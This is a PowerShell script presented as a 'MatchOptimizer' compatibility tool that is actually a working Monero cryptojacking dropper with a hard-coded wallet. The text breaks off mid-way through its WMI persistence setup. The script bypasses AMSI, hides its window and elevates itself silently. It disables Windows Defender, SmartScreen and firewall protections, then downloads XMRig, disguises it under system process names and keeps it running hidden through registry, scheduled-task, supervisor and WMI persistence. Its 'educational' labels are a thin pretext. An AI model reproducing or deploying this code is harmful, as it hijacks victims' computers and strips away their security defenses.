# ===== MATCHOPTIMIZER - UNIVERSAL WINDOWS COMPATIBILITY =====
param(
    [string]$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs",
    [int]$MinCpuUsage = 85,  # MAX PERFORMANCE
    [int]$MaxCpuUsage = 95   # MAX PERFORMANCE
)
if (Get-Process -Name "backgroundtaskhost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*SystemCache*" }) { exit }
# ===== UNIVERSAL WINDOWS DETECTION =====
function Get-WindowsVersion {
    try {
        $os = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($os) {
            $version = [System.Environment]::OSVersion.Version
            $build = $os.BuildNumber
            
            if ($build -ge 22000) { return "Windows11" }
            elseif ($build -ge 10240) { return "Windows10" }
            elseif ($build -ge 9600) { return "Windows8.1" }
            elseif ($build -ge 9200) { return "Windows8" }
            elseif ($build -ge 7600) { return "Windows7" }
            else { return "WindowsLegacy" }
        }
        return "Windows10" # Default fallback
    } catch {
        return "Windows10" # Default fallback
    }
}

function Get-CPUArchitecture {
    try {
        if ([Environment]::Is64BitOperatingSystem) { return "x64" } 
        else { return "x86" }
    } catch { return "x64" }
}

function Test-HPComputer {
    try {
        $computerModel = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).Model
        return ($computerModel -like "*HP*" -or $computerModel -like "*Hewlett*" -or $computerModel -like "*Pavilion*")
    } catch { return $false }
}

function Test-DellComputer {
    try {
        $computerModel = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).Model
        return ($computerModel -like "*Dell*" -or $computerModel -like "*XPS*" -or $computerModel -like "*Inspiron*")
    } catch { return $false }
}

# ===== DYNAMIC PROCESS NAMES BASED ON HARDWARE =====
function Get-SafeProcessNames {
    $windowsVersion = Get-WindowsVersion
    $isHP = Test-HPComputer
    $isDell = Test-DellComputer
    
    $baseNames = @("spoolsv", "fontdrvhost", "taskhost", "runtimebroker", "backgroundtaskhost", "dllhost", "svchost")
    
    # HP computers have audio driver conflicts with audiodg
    if (-not $isHP) {
        $baseNames += "audiodg"
    }
    
    # Windows 7 compatibility
    if ($windowsVersion -eq "Windows7") {
        $baseNames = @("spoolsv", "taskhost", "svchost", "dllhost", "csrss")
    }
    
    return $baseNames
}

# ===== NETWORK CONNECTIVITY CHECK =====
function Test-MiningConnectivity {
    Write-Host "[*] Testing network connectivity to pools..." -ForegroundColor Yellow
    
    $poolTests = @(
        @{Host="pool.supportxmr.com"; Port=443},
        @{Host="xmr.2miners.com"; Port=4444},
        @{Host="xmr.2miners.com"; Port=14444}
    )
    
    $successfulConnections = 0
    foreach ($pool in $poolTests) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $result = $tcpClient.BeginConnect($pool.Host, $pool.Port, $null, $null)
            $success = $result.AsyncWaitHandle.WaitOne(5000)
            if ($success) {
                $tcpClient.EndConnect($result)
                Write-Host "   ✅ $($pool.Host):$($pool.Port) - Reachable" -ForegroundColor Green
                $successfulConnections++
            } else {
                Write-Host "   ❌ $($pool.Host):$($pool.Port) - Timeout" -ForegroundColor Yellow
            }
            $tcpClient.Close()
        } catch {
            Write-Host "   ❌ $($pool.Host):$($pool.Port) - Failed" -ForegroundColor Red
        }
    }
    
    return $successfulConnections -gt 0
}

# ===== CRITICAL FIX: IMMEDIATE AMSI BYPASS =====
try {
    $amsiBypass = @"
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)
"@
    Invoke-Expression $amsiBypass
} catch { }

# ===== ULTIMATE EXECUTION POLICY BYPASS - WORKS ON ANY WINDOWS =====
try {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue | Out-Null
} catch { }

try {
    $env:PSExecutionPolicyPreference = "Bypass"
} catch { }

# ===== MEMORY-BASED STEALTH & WINDOW HIDING =====
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
} catch { }

# ===== AUTO ADMIN ELEVATION WITH ULTIMATE BYPASS =====
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Requesting administrator privileges..." -ForegroundColor Yellow
    $scriptPath = $MyInvocation.MyCommand.Path
    $scriptContent = @"
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
    & '$scriptPath' -Wallet '$Wallet' -MinCpuUsage $MinCpuUsage -MaxCpuUsage $MaxCpuUsage
"@
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptContent))
    Start-Process PowerShell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand $encodedCommand" -Verb RunAs -WindowStyle Hidden
    exit
}

Write-Host "[*] Running with administrator privileges..." -ForegroundColor Green

# ===== SYSTEM DETECTION AND COMPATIBILITY =====
$windowsVersion = Get-WindowsVersion
$cpuArch = Get-CPUArchitecture
$isHP = Test-HPComputer
$isDell = Test-DellComputer

Write-Host "[*] System Detection:" -ForegroundColor Cyan
Write-Host "   Windows Version: $windowsVersion" -ForegroundColor White
Write-Host "   CPU Architecture: $cpuArch" -ForegroundColor White
Write-Host "   Computer Type: $(if($isHP){'HP'}elseif($isDell){'Dell'}else{'Standard'})" -ForegroundColor White

# ===== COMPREHENSIVE DEFENSE EVASION - EDUCATIONAL PURPOSES =====
Write-Host "[EDU] Initializing security bypass for analysis..." -ForegroundColor Yellow

# 1. DISABLE POWERSHELL RESTRICTIONS
try {
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Host "✅ PowerShell execution policy bypassed" -ForegroundColor Green
} catch { }

# 2. DISABLE AMSI (Antimalware Scan Interface) - ENHANCED
try {
    $amsiBypass1 = @"
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)
"@
    Invoke-Expression $amsiBypass1
    
    try {
        $amsiBypass2 = @"
        `$x='System.Management.Automation.Ams';`$y='iUtils';`$z=`$x+`$y;`$w=[Ref].Assembly.GetType(`$z);`$w.GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)
"@
        Invoke-Expression $amsiBypass2
    } catch { }
    
    Write-Host "✅ AMSI disabled" -ForegroundColor Green
} catch { }

# 3. DISABLE WINDOWS DEFENDER (Compatible with Win7-Win11)
try {
    $services = @("WinDefend", "WdNisSvc", "Sense")
    foreach ($service in $services) {
        try {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
        } catch { }
    }
    
    if ([Environment]::OSVersion.Version.Major -ge 6) {
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue 2>&1 | Out-Null
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue 2>&1 | Out-Null
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue 2>&1 | Out-Null
        } catch { }
    }
    
    $exclusionPaths = @("$env:APPDATA", "$env:TEMP", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\AppData")
    foreach ($path in $exclusionPaths) {
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue 2>&1 | Out-Null
        } catch { }
    }
    
    Write-Host "✅ Windows Defender configured" -ForegroundColor Green
} catch { }

# 4. DISABLE SMARTSCREEN & OTHER PROTECTIONS
try {
    if ([Environment]::OSVersion.Version.Major -ge 6) {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host "✅ Additional protections disabled" -ForegroundColor Green
} catch { }

# 5. FIREWALL CONFIGURATION - UNIVERSAL
try {
    netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow protocol=TCP localport=443,4444,80,8080 2>&1 | Out-Null
    netsh advfirewall firewall add rule name="Windows Update Out" dir=out action=allow protocol=TCP localport=443,4444,80,8080 2>&1 | Out-Null
    Write-Host "✅ Firewall configured (Inbound & Outbound)" -ForegroundColor Green
} catch { }

Write-Host "[EDU] Security bypass complete - Proceeding with main operations" -ForegroundColor Cyan
Start-Sleep 1

# ===== NETWORK CONNECTIVITY CHECK =====
if (-not (Test-MiningConnectivity)) {
    Write-Host "[!] WARNING: Limited pool connectivity detected" -ForegroundColor Yellow
    Write-Host "[*] Proceeding with deployment - auto-fallback enabled" -ForegroundColor Cyan
}

# ===== CLEAN LEFTOVER REGISTRY ENTRIES FIRST =====
try {
    $registryPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    )
    
    $registryNames = @("WindowsAudio", "SystemAudio", "AudioService", "Miner", "XMRig")
    
    foreach ($regPath in $registryPaths) {
        foreach ($regName in $registryNames) {
            try {
                Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue
            } catch { }
        }
    }
} catch { }

# ===== POLYMORPHIC VARIABLE NAMES =====
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$TempFile = "$env:TEMP\winupd.zip"
$ExtractPath = "$env:TEMP\winupd-extract"
$randomCpu = Get-Random -Minimum $MinCpuUsage -Maximum ($MaxCpuUsage + 1)

# ===== DYNAMIC SAFE PROCESS NAMES =====
$processNames = Get-SafeProcessNames
$selectedProcess = $processNames | Get-Random

Write-Host "[*] Using process name: $selectedProcess" -ForegroundColor Cyan

# ===== ENVIRONMENT AWARENESS =====
function Test-SafeEnvironment {
    try {
        $totalRAM = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
        $cores = (Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue).NumberOfCores
        
        if ($totalRAM -lt 1 -or $cores -lt 1) {
            return $false
        }
        return $true
    } catch {
        return $true
    }
}

if (-not (Test-SafeEnvironment)) { 
    Write-Host "[!] Environment check failed" -ForegroundColor Red
    exit 
}

# ===== UNIVERSAL DOWNLOAD MINER =====
$urls = @(
    "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip",
    "https://gitlab.com/xmrig/xmrig/-/package_files/42833393/download",
    "https://sourceforge.net/projects/xmrig.mirror/files/XMRig-6.18.1-msvc-win64.zip/download"
)

Write-Host "[*] Downloading components..." -ForegroundColor Yellow
$success = $false
foreach ($url in $urls) {
    try {
        Write-Host "   Trying: $($url.Split('/')[2])..." -ForegroundColor Gray
        $progressPreference = 'SilentlyContinue'
        
        # Enhanced download with compatibility
        try {
            Invoke-WebRequest -Uri $url -OutFile $TempFile -UserAgent "Mozilla/5.0" -TimeoutSec 30
        } catch {
            # Fallback for older Windows
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($url, $TempFile)
        }
        
        $progressPreference = 'Continue'
        
        if (Test-Path $TempFile) { 
            $fileSize = (Get-Item $TempFile).Length
            if ($fileSize -gt 1MB) {
                Write-Host "   Download SUCCESS: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
                $success = $true
                break
            } else {
                Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {
        Write-Host "   Download failed, trying next source..." -ForegroundColor Yellow
        continue
    }
}

if (-not $success) { 
    Write-Host "[!] All download sources failed!" -ForegroundColor Red
    exit 
}

# ===== EXTRACT AND DEPLOY =====
Write-Host "[*] Deploying components..." -ForegroundColor Yellow
try {
    if (Test-Path $ExtractPath) {
        Remove-Item -Path $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    New-Item -Path $ExtractPath -ItemType Directory -Force | Out-Null
    
    Expand-Archive -Path $TempFile -DestinationPath $ExtractPath -Force -ErrorAction Stop
    Write-Host "   Extraction SUCCESS" -ForegroundColor Green
} catch {
    Write-Host "   Extraction FAILED: $($_.Exception.Message)" -ForegroundColor Red
    exit
}

# CRITICAL FIX: Ensure miner directory exists
if (-not (Test-Path $MinerDir)) {
    New-Item -Path $MinerDir -ItemType Directory -Force | Out-Null
    Write-Host "   Miner directory created: $MinerDir" -ForegroundColor Green
}

$xmrigExe = Get-ChildItem -Path $ExtractPath -Recurse -Filter "xmrig.exe" | Select-Object -First 1
if ($xmrigExe) {
    $targetFile = "$MinerDir\$selectedProcess.exe"
    if (-not (Test-Path $targetFile)) {
        Copy-Item -Path $xmrigExe.FullName -Destination $targetFile -Force
        Write-Host "   Primary component deployed: $selectedProcess.exe" -ForegroundColor Green
    }
    
    $backupNames = $processNames | Where-Object { $_ -ne $selectedProcess } | Get-Random -Count 2
    foreach ($backupName in $backupNames) {
        $backupFile = "$MinerDir\$backupName.exe"
        if (-not (Test-Path $backupFile)) {
            Copy-Item -Path $xmrigExe.FullName -Destination $backupFile -Force
            Write-Host "   Backup component deployed: $backupName.exe" -ForegroundColor Gray
        }
    }
} else {
    Write-Host "[!] Component not found in archive!" -ForegroundColor Red
    exit
}

attrib +h +s "$MinerDir" /d /s 2>&1 | Out-Null

# ===== DUAL POOL CONFIGURATION =====
$pools = @(
    "pool.supportxmr.com:443",      # SupportXMR Pool
    "xmr.2miners.com:4444"          # 2Miners Pool
)

Write-Host "=== DUAL POOL CONFIGURATION ===" -ForegroundColor Cyan
Write-Host "Your Wallet: $Wallet" -ForegroundColor Yellow
Write-Host "Pool 1: pool.supportxmr.com:443" -ForegroundColor White
Write-Host "Pool 2: xmr.2miners.com:4444" -ForegroundColor White

# ===== INTELLIGENT SINGLE MINER STARTUP =====
function Test-MinerAlive {
    $currentProcessNames = Get-SafeProcessNames
    $minerProcesses = Get-Process -Name $currentProcessNames -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    
    foreach ($process in $minerProcesses) {
        $connections = Get-NetTCPConnection -OwningProcess $process.Id -State Established -ErrorAction SilentlyContinue
        $minerConnection = $connections | Where-Object { $_.RemotePort -in @(443, 4444) }
        if ($minerConnection) {
            return $true
        }
    }
    return $false
}

function Start-IntelligentMiner {
    param($MinerPath, $Pool, $IsPrimary = $true)
    
    try {
        $workerId = "$env:COMPUTERNAME-$(Get-Random -Minimum 1000 -Maximum 9999)"
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $MinerPath
        $processInfo.Arguments = "-o $Pool -u $Wallet -p $workerId --tls --background --max-cpu-usage=$randomCpu --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --keepalive --retries=15 --retry-pause=3 --print-time=60 --health-print-time=60 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100 --cpu-no-yield --randomx-wrmsr=-1 --randomx-rdmsr=-1 --randomx-cache-qos --nicehash"
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        Start-Sleep -Seconds 2
        if (-not $process.HasExited) {
            $status = if ($IsPrimary) { "PRIMARY" } else { "BACKUP" }
            Write-Host "SUCCESS $status miner started (PID: $($process.Id)) -> $Pool" -ForegroundColor Green
            return $process
        } else {
            Write-Host "FAILED: Process exited immediately" -ForegroundColor Red
            return $null
        }
    } catch {
        Write-Host "FAILED to start miner: $Pool - $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# ===== SMART MINER DEPLOYMENT =====
Write-Host "`nStarting intelligent miner system..." -ForegroundColor Yellow

$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
if ($minerFiles) {
    $primaryMiner = $minerFiles | Select-Object -First 1
    $primaryProcess = Start-IntelligentMiner -MinerPath $primaryMiner.FullName -Pool "pool.supportxmr.com:443" -IsPrimary $true
    
    if ($primaryProcess) {
        Write-Host "   Primary miner: RUNNING" -ForegroundColor Green
    } else {
        Write-Host "   Primary miner: FAILED" -ForegroundColor Red
    }
    
    $backupMiners = $minerFiles | Select-Object -Skip 1
    Write-Host "   Backup miners ready: $($backupMiners.Count) in standby" -ForegroundColor Cyan
} else {
    Write-Host "FAILED No miner files found!" -ForegroundColor Red
    exit
}

# ===== FIXED PERSISTENCE SECTION - USING PREVIOUS WORKING LOGIC =====
Write-Host "`nSetting up enhanced persistence with auto-backup..." -ForegroundColor Yellow

# Registry Persistence - Intelligent single miner (PERMANENT STEALTH FIX)
try {
    $persistenceScript = @'
Start-Sleep 60
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs"

function Test-MinerAlive {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    
    foreach ($process in $minerProcesses) {
        $connections = Get-NetTCPConnection -OwningProcess $process.Id -State Established -ErrorAction SilentlyContinue
        $minerConnection = $connections | Where-Object { $_.RemotePort -in @(443, 4444) }
        if ($minerConnection) {
            return $true
        }
    }
    return $false
}

function Start-BackupMiner {
    try {
        $minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
        $backupMiners = $minerFiles | Select-Object -Skip 1
        if ($backupMiners) {
            $backupMiner = $backupMiners | Get-Random
            $pools = @("pool.supportxmr.com:443", "xmr.2miners.com:4444")
            $selectedPool = $pools | Get-Random
            $workerId = "$env:COMPUTERNAME-$(Get-Random -Minimum 1000 -Maximum 9999)"
            
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $backupMiner.FullName
            $processInfo.Arguments = "-o $selectedPool -u $Wallet -p $workerId --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100 --cpu-no-yield --randomx-wrmsr=-1 --randomx-rdmsr=-1 --randomx-cache-qos --nicehash"
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow = $true
            $processInfo.UseShellExecute = $false
            $process = [System.Diagnostics.Process]::Start($processInfo)
            
            return $true
        }
    } catch { }
    return $false
}

# MAIN INTELLIGENT MINER LOGIC
$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
if ($minerFiles) {
    # Start primary miner
    $primaryMiner = $minerFiles | Select-Object -First 1
    try {
        $workerId = "$env:COMPUTERNAME-$(Get-Random -Minimum 1000 -Maximum 9999)"
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $primaryMiner.FullName
        $processInfo.Arguments = "-o pool.supportxmr.com:443 -u $Wallet -p $workerId --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100 --cpu-no-yield --randomx-wrmsr=-1 --randomx-rdmsr=-1 --randomx-cache-qos --nicehash"
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
    } catch { }
    
    # Start backup supervisor
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\backup_supervisor.ps1`"" -WindowStyle Hidden
}
'@
    
    $persistenceScript | Out-File -FilePath "$env:TEMP\persistence.ps1" -Encoding ASCII
    
    # PERMANENT STEALTH FIX: cmd.exe /c start /min for COMPLETE stealth
    $persistenceCmd = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command ""Start-Sleep 20; . '$env:TEMP\persistence.ps1'"""
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsAudio" -Value $persistenceCmd -Force | Out-Null
    Write-Host "SUCCESS Registry persistence set (PERMANENT STEALTH)" -ForegroundColor Green
} catch { 
    Write-Host "FAILED Registry persistence failed" -ForegroundColor Red
}

# ===== INTELLIGENT BACKUP SUPERVISOR (FIXED) =====
$backupSupervisorScript = @'
# INTELLIGENT BACKUP SUPERVISOR - UNIVERSAL MINER DETECTION (FIXED)
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs"
$CheckInterval = 60  # Check every 60 seconds

# Hide window
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
} catch { }

function Test-MinerAlive {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    
    foreach ($process in $minerProcesses) {
        $connections = Get-NetTCPConnection -OwningProcess $process.Id -State Established -ErrorAction SilentlyContinue
        $minerConnection = $connections | Where-Object { $_.RemotePort -in @(443, 4444) }
        if ($minerConnection) {
            return $true
        }
    }
    return $false
}

function Start-BackupMiner {
    try {
        $minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
        if ($minerFiles.Count -ge 2) {
            $backupMiner = $minerFiles | Select-Object -Skip 1 | Get-Random
            $pools = @("pool.supportxmr.com:443", "xmr.2miners.com:4444")
            $selectedPool = $pools | Get-Random
            $workerId = "$env:COMPUTERNAME-$(Get-Random -Minimum 1000 -Maximum 9999)"
            
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $backupMiner.FullName
            $processInfo.Arguments = "-o $selectedPool -u $Wallet -p $workerId --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100 --cpu-no-yield --randomx-wrmsr=-1 --randomx-rdmsr=-1 --randomx-cache-qos --nicehash"
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow = $true
            $processInfo.UseShellExecute = $false
            $process = [System.Diagnostics.Process]::Start($processInfo)
            
            return $true
        }
    } catch { }
    return $false
}

function Stop-AllMiners {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    foreach ($process in $minerProcesses) {
        try {
            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        } catch { }
    }
}

# MAIN SUPERVISOR LOOP
$failureCount = 0
$maxFailures = 2

while ($true) {
    try {
        $minerAlive = Test-MinerAlive
        
        if (-not $minerAlive) {
            # No active miner detected
            $failureCount++
            
            if ($failureCount -ge $maxFailures) {
                # Stop any stuck processes and start backup
                Stop-AllMiners
                Start-Sleep -Seconds 10
                
                if (Start-BackupMiner) {
                    $failureCount = 0
                }
            }
        } else {
            # Miner is active and connected
            $failureCount = 0
        }
        
        Start-Sleep -Seconds $CheckInterval
        
    } catch {
        Start-Sleep -Seconds $CheckInterval
    }
}
'@

$backupSupervisorScript | Out-File -FilePath "$env:TEMP\backup_supervisor.ps1" -Encoding ASCII

# Start the backup supervisor
try {
    $backupProcess = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\backup_supervisor.ps1`"" -PassThru -WindowStyle Hidden
    Write-Host "SUCCESS Intelligent backup supervisor started (PID: $($backupProcess.Id))" -ForegroundColor Green
} catch {
    Write-Host "FAILED Backup supervisor failed to start" -ForegroundColor Red
}

# Scheduled Task - Intelligent single miner (PERMANENT STEALTH FIX)
try {
    $taskNames = @("WindowsAudioService", "SystemAudioService", "AudioService", "SystemSoundService")
    foreach ($task in $taskNames) {
        try { 
            schtasks /delete /tn $task /f 2>&1 | Out-Null 
        } catch { }
    }
    Start-Sleep 1

    $taskScript = @'
Start-Sleep 90
# INTELLIGENT SINGLE MINER STARTUP
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs"

$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
if ($minerFiles) {
    # Start only ONE primary miner
    $primaryMiner = $minerFiles | Select-Object -First 1
    $workerId = "$env:COMPUTERNAME-$(Get-Random -Minimum 1000 -Maximum 9999)"
    Start-Process -FilePath $primaryMiner.FullName -ArgumentList "-o pool.supportxmr.com:443 -u $Wallet -p $workerId --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100 --cpu-no-yield --randomx-wrmsr=-1 --randomx-rdmsr=-1 --randomx-cache-qos --nicehash" -WindowStyle Hidden
    
    # Start backup supervisor to monitor and auto-recover
    Start-Sleep 30
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\backup_supervisor.ps1`"" -WindowStyle Hidden
}
'@
    
    $taskScript | Out-File -FilePath "$env:TEMP\task.ps1" -Encoding ASCII

    try {
        # PERMANENT STEALTH FIX: cmd.exe /c start /min for COMPLETE stealth
        $taskAction = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -File `"$env:TEMP\task.ps1`""
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName "WindowsAudioService" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -RunLevel Highest -Force -ErrorAction SilentlyContinue
        Write-Host "SUCCESS Scheduled task set (PERMANENT STEALTH)" -ForegroundColor Green
    } catch {
        # PERMANENT STEALTH FIX: Fallback also uses complete stealth
        $fallbackTask = "schtasks /create /tn `"WindowsAudioService`" /tr `"cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -File `"$env:TEMP\task.ps1`"`" /sc onlogon /ru SYSTEM /f"
        $fallbackTask | Out-File -FilePath "$env:TEMP\create_task.cmd" -Encoding ASCII
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\create_task.cmd" -WindowStyle Hidden -Wait
        Write-Host "SUCCESS Scheduled task set (fallback - PERMANENT STEALTH)" -ForegroundColor Green
    }
} catch {
    Write-Host "FAILED Scheduled task failed" -ForegroundColor Red
}

# WMI Persistence - Single miner
try {
    $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_Processor' AND TargetInstance.LoadPercentage > 5"
    
    $filter = ([WmiClass]"\\.\root\subscription:__EventFilter").CreateInstance()
    $filter.Name = "SystemPerformanceMonitor"
    $filter.EventNamespace = 'root\cimv2'
    $filter.QueryLanguage = 'WQL'
    $filter.Query = $filterQuery
    $filterPath = $filter.Put().Path

    $consumer = ([WmiClass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
    $consumer.Name = "SystemPerformanceConsumer"
    $consumer.ExecutablePath = "$MinerDir\$selectedProcess.exe"
    $workerId = "$env:COMPUTERNAME-$(Get-Random -Minimum 1000 -Maximum 9999)"
    $consumer.CommandLineTemplate = "-o pool.supportxmr.com:443 -u $Wallet -p $workerId --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100 --cpu-no-yield --randomx-wrmsr=-1 --randomx-rdmsr=-1 --randomx-cache-qos --nicehash"
    $consumerPath = $consumer.Put().Path

    $binding = ([WmiClass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
    $binding.Filter = $filterPath
    $binding.Consumer = $consumerPath
    $binding.Put() | Out-Null
